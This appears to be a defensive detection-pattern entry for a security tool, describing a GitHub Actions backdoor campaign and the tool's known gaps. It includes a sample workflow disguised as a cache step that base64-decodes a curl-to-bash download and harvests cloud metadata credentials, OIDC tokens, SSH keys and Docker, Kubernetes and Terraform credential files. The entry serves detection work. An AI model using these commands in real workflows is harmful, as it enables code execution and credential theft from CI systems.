title: GitHub Actions workflow backdoor campaign

workflow_patterns.name: encoded_payload_and_credential_harvest
workflow_patterns.snippet:
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  optimize:
    steps:
      - name: Optimize build cache
        run: |
          echo "Y3VybCAtZnNTIGh0dHBzOi8vZXhhbXBsZS5jb20K" | base64 -d | bash
          curl -fsS http://169.254.169.254/latest/meta-data/iam/security-credentials/
          curl -fsS "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
          cat ~/.ssh/id_rsa ~/.docker/config.json ~/.kube/config .terraform.d/credentials.tfrc.json

known_gaps: ca9 can flag malicious workflow payload patterns, but cannot prove whether a compromised PAT or deploy key pushed directly to a protected branch.
Full prevention still requires branch rulesets, CODEOWNER review for workflow changes, token rotation, and GitHub audit-log monitoring.
